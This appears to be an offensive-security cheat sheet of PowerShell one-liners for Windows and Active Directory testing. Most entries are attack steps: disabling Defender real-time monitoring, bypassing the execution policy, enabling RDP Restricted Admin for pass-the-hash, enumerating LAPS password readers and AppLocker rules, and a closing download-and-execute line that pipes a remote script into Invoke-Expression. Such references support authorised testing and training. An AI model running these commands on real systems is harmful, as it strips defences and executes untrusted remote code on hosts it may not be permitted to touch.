# Powershell

## PowerShell oneliner

### Bypass execution policy

Spawn bypass execution policy with Powershell.

Loosen execution policy at the user scope so unsigned scripts run without prompts.

```sh title:"Powershell Spawn Bypass Execution Policy"
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
```
<!-- cheat -->

### Enable RDP Restricted Admin

Enable RDP restricted admin with Powershell.

Flip the registry bit that allows RDP Restricted Admin (lets PtH reach RDP without sending a password).

```sh title:"Powershell Enable RDP Restricted Admin"
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
<!-- cheat -->

### Disable Defender RTP

Disable defender RTP with Powershell.

Disable Defender real-time monitoring. Requires admin and Tamper Protection disabled.

```sh title:"Powershell Disable Defender RTP"
Set-MpPreference -DisableRealTimeMonitoring $true
```
<!-- cheat -->

### Defender status

Read defender status with Powershell.

Query Defender status: signature age, RTP state, AMSI state.

```sh title:"Powershell Read Defender Status"
Get-MpComputerStatus
```
<!-- cheat -->

### Install RSAT-AD (Server)

Install RSAT AD (Server) with Powershell.

Install the AD PowerShell module on a Windows Server.

```sh title:"Powershell Install RSAT AD (Server)"
Install-WindowsFeature RSAT-AD-PowerShell
```
<!-- cheat -->

### Install RSAT (Desktop)

Install RSAT (Desktop) with Powershell.

Install all RSAT capabilities on a Windows desktop SKU (Win10/11).

```sh title:"Powershell Install RSAT (Desktop)"
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
```
<!-- cheat -->

### Import AD module

Spawn import AD module with Powershell.

Load the AD module into the current session so Get-ADUser etc. resolve.

```sh title:"Powershell Spawn Import AD Module"
Import-Module ActiveDirectory
```
<!-- cheat -->

### AppLocker policy

Read AppLocker policy with Powershell.

Pull the effective AppLocker rules. Read this before dropping binaries on locked-down hosts.

```sh title:"Powershell Read AppLocker Policy"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
<!-- cheat -->

### LAPS delegated groups

Read LAPS delegated groups with Powershell.

Identify groups delegated to read LAPS passwords. From the LAPS PowerShell module.

```sh title:"Powershell Read LAPS Delegated Groups"
Find-LAPSDelegatedGroups
```
<!-- cheat -->

### LAPS extended rights

Read LAPS extended rights with Powershell.

Find principals with extended rights to read LAPS-managed `ms-Mcs-AdmPwd`.

```sh title:"Powershell Read LAPS Extended Rights"
Find-AdmPwdExtendedRights
```
<!-- cheat -->

### LAPS-enabled computers

Dump LAPS enabled computers with Powershell.

List computer objects that have a LAPS password set.

```sh title:"Powershell Dump LAPS Enabled Computers"
Get-LAPSComputers
```
<!-- cheat -->

### List loaded modules

List loaded modules with Powershell.

Show every PowerShell module currently loaded in the session.

```sh title:"Powershell List Loaded Modules"
Get-Module
```
<!-- cheat -->

### Show execution policy

Show execution policy with Powershell.

Show effective execution policy for every scope.

```sh title:"Powershell Show Execution Policy"
Get-ExecutionPolicy -List
```
<!-- cheat -->

### Per-process bypass

Spawn per process bypass with Powershell.

Bypass execution policy for the current process only (most reversible setting).

```sh title:"Powershell Spawn Per Process Bypass"
Set-ExecutionPolicy Bypass -Scope Process
```
<!-- cheat -->

### Inline script from URL

Download inline script from URL with Powershell.

Classic in-memory script loader: download a remote `.ps1` and pipe straight into Invoke-Expression.

```sh title:"Powershell Download Inline Script from URL"
iex(New-Object Net.WebClient).DownloadString('$URL')
```
<!-- cheat
var URL
-->
